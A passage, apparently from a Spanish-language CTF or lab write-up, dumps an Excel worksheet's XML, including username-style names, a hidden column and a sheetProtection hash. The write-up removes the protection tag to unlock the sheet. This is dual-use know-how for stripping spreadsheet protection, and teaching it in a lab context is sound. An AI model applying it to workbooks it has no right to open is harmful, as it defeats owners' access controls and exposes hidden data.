class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A4"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;7&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B4"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;8&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C4"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;46&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D4"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Bobby.Wolf&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"5"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A5"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;9&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B5"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;10&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C5"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;35&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D5"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Margaret.Robinson&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"6"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A6"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;12&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B6"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;13&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C6"</span> <span class="nv">s</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;36&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D6"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Scarlett.Parks&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"7"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A7"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;14&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B7"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;15&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C7"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;37&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D7"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Eliezer.Jordan&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"8"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A8"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;16&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B8"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;17&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C8"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;38&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D8"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">ref</span><span class="o">=</span><span class="s2">"D8:D15"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span><span class="o">&gt;</span>A8&amp;amp<span class="p">;</span><span class="s2">"."</span>&amp;amp<span class="p">;</span>B8&lt;/f&gt;&lt;v&gt;Hunter.Kirby&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"9"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A9"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;29&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B9"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;30&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C9"</span> <span class="nv">s</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;48&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D9"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f&gt;A9&amp;amp<span class="p">;</span><span class="s2">"."</span>&amp;amp<span class="p">;</span>B9&lt;/f&gt;&lt;v&gt;Sierra.Frye&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"10"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A10"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;18&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B10"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;19&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C10"</span> <span class="nv">s</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;39&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D10"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Annabelle.Wells&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"11"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A11"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;20&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B11"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;21&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C11"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;40&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D11"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Eve.Galvan&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"12"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A12"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;22&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B12"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;23&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C12"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;41&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D12"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Jeramiah.Fritz&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"13"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A13"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;24&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B13"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;25&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C13"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;42&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D13"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Abby.Gonzalez&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"14"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A14"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;26&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B14"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;11&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C14"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;43&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D14"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Joy.Costa&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"15"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A15"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;27&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B15"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;28&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C15"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;47&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D15"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Vincent.Sutton&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"17"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"3:3"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C17"</span> <span class="nv">s</span><span class="o">=</span><span class="s2">"4"</span>/&gt;&lt;/row&gt;&lt;/sheetData&gt;&lt;sheetProtection <span class="nv">algorithmName</span><span class="o">=</span><span class="s2">"SHA-512"</span> <span class="nv">hashValue</span><span class="o">=</span><span class="s2">"hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg=="</span> <span class="nv">saltValue</span><span class="o">=</span><span class="s2">"U9oZfaVCkz5jWdhs9AA8nA=="</span> <span class="nv">spinCount</span><span class="o">=</span><span class="s2">"100000"</span> <span class="nv">sheet</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">objects</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">scenarios</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;pageMargins <span class="nv">left</span><span class="o">=</span><span class="s2">"0.7"</span> <span class="nv">right</span><span class="o">=</span><span class="s2">"0.7"</span> <span class="nv">top</span><span class="o">=</span><span class="s2">"0.75"</span> <span class="nv">bottom</span><span class="o">=</span><span class="s2">"0.75"</span> <span class="nv">header</span><span class="o">=</span><span class="s2">"0.3"</span> <span class="nv">footer</span><span class="o">=</span><span class="s2">"0.3"</span>/&gt;&lt;pageSetup <span class="nv">paperSize</span><span class="o">=</span><span class="s2">"9"</span> <span class="nv">orientation</span><span class="o">=</span><span class="s2">"portrait"</span> r:id<span class="o">=</span><span class="s2">"rId1"</span>/&gt;&lt;/worksheet&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a eliminar la etiqueta <code class="language-plaintext highlighter-rouge">sheetProtection</code> para que quede así.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  document <span class="nb">cat </span>xl/worksheets/sheet2.xml
+&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span> <span class="nv">standalone</span><span class="o">=</span><span class="s2">"yes"</span>?&gt;
+&lt;worksheet <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://schemas.openxmlformats.org/spreadsheetml/2006/main"</span> xmlns:r<span class="o">=</span><span class="s2">"http://schemas.openxmlformats.org/officeDocument/2006/relationships"</span> xmlns:mc<span class="o">=</span><span class="s2">"http://schemas.openxmlformats.org/markup-compatibility/2006"</span> mc:Ignorable<span class="o">=</span><span class="s2">"x14ac xr xr2 xr3"</span> xmlns:x14ac<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/office/spreadsheetml/2009/9/ac"</span> xmlns:xr<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/office/spreadsheetml/2014/revision"</span> xmlns:xr2<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/office/spreadsheetml/2015/revision2"</span> xmlns:xr3<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/office/spreadsheetml/2016/revision3"</span> xr:uid<span class="o">=</span><span class="s2">"{00000000-0001-0000-0100-000000000000}"</span><span class="o">&gt;</span>&lt;dimension <span class="nv">ref</span><span class="o">=</span><span class="s2">"A1:D17"</span>/&gt;&lt;sheetViews&gt;&lt;sheetView <span class="nv">tabSelected</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">workbookViewId</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>&lt;selection <span class="nv">activeCell</span><span class="o">=</span><span class="s2">"F19"</span> <span class="nv">sqref</span><span class="o">=</span><span class="s2">"F19"</span>/&gt;&lt;/sheetView&gt;&lt;/sheetViews&gt;&lt;sheetFormatPr <span class="nv">defaultRowHeight</span><span class="o">=</span><span class="s2">"15"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span>/&gt;&lt;cols&gt;&lt;col <span class="nv">min</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">max</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"10.140625"</span> <span class="nv">bestFit</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">customWidth</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;col <span class="nv">min</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">max</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"37.5703125"</span> <span class="nv">hidden</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">customWidth</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;col <span class="nv">min</span><span class="o">=</span><span class="s2">"4"</span> <span class="nv">max</span><span class="o">=</span><span class="s2">"4"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"19.140625"</span> <span class="nv">bestFit</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">customWidth</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;/cols&gt;&lt;sheetData&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A1"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;0&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B1"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;1&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C1"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;2&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D1"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;31&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;3&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;4&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;44&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">ref</span><span class="o">=</span><span class="s2">"D2:D7"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>A2&amp;amp<span class="p">;</span><span class="s2">"."</span>&amp;amp<span class="p">;</span>B2&lt;/f&gt;&lt;v&gt;Payton.Harmon&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;5&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;6&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;45&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Cortez.Hickman&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"4"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A4"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;7&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B4"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;8&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C4"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;46&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D4"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Bobby.Wolf&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"5"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A5"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;9&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B5"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;10&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C5"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;35&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D5"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Margaret.Robinson&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"6"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A6"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;12&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B6"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;13&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C6"</span> <span class="nv">s</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;36&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D6"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Scarlett.Parks&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"7"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A7"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;14&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B7"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;15&lt;/v&gt;&lt;/c&gt;&lt;c <span 